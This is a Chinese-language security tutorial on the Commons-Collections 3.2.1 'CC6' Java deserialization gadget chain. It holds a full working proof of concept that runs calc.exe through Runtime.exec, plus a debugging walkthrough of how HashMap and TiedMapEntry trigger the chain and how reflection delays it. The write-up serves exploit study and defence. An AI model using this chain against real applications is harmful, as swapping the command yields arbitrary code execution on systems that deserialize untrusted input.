## CommonsCollections_6

本机环境：

JDK版本：jdk1.7u_51

CC版本：Commons-Collections 3.2.1

![image-20220719150534383](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719150534383.png)

## POC&复现

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CommonCollections6 {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] { "calc.exe" }),
                new ConstantTransformer(1),
        };
        //创建一个空的 ChainedTransformer
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        //创建LazyMap并引入 TiedMapEntry
        Map innerMap = new HashMap();
        //恶意LazyMap对象outerMap
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        //将其作为 TiedMapEntry 的map属性
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        //将 tme 对象作为 HashMap 的⼀个key
        HashMap expMap = new HashMap();
        expMap.put(tme,"keykey");
        outerMap.remove("keykey");


        //反射修改
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

![image-20220719142451622](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719142451622.png)

## 调式分析

在cc5，通过对`TiedMapEntry#toString`方法的调用，触发了`TiedMapEntry#getValue`，从而触发了`LazyMap#get`完成后半段的调用。

而在cc6中则是通过`TiedMapEntry#hashCode`触发对`TiedMapEntry#getValue`的调用：

![image-20220719142532112](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719142532112.png)

在反序列化一个 HashMap 对象时，会调用 key 对象的 hashCode 方法计算 hash 值。那在此处当然也可以用来触发 TiedMapEntry 的 hashCode 方法。

![image-20220719143051467](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719143051467.png)

这里跟到`HashMap#put`

![image-20220719143431642](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719143431642.png)

ysoserial中，是利⽤ `java.util.HashSet#readObject `到` HashMap#put()` 到 `HashMap#hash(key)`

最后到 `TiedMapEntry#hashCode() `。

实际上在 `java.util.HashMap#readObject `中就可以找到` HashMap#hash()` 的调⽤，这里首先调用了putForCreate方法

![image-20220719151101658](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719151101658.png)

其中便调用了hash

![image-20220719151151582](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719151151582.png)

所以，我们只需要让这个key等于TiedMapEntry对象即可构造一个完整的利用链。

但是这里会面临一个问题，调用链会在 HashMap 的 put 方法调用时提前触发，需要想办法绕过触发。

在URLDNS链中，`Ysoserial`创建了一个URLStreamHandler的子类：SilentURLStreamHandler，该类重写了`getHostAddress()`方法，防止put的触发。

这里我们可以在向 HashMap push LazyMap 时先给个空的 ChainedTransformer，这样添加的时候不会执行任何恶意动作，put 之后再反射将有恶意链的 Transformer 数组写到 ChainedTransformer 中。



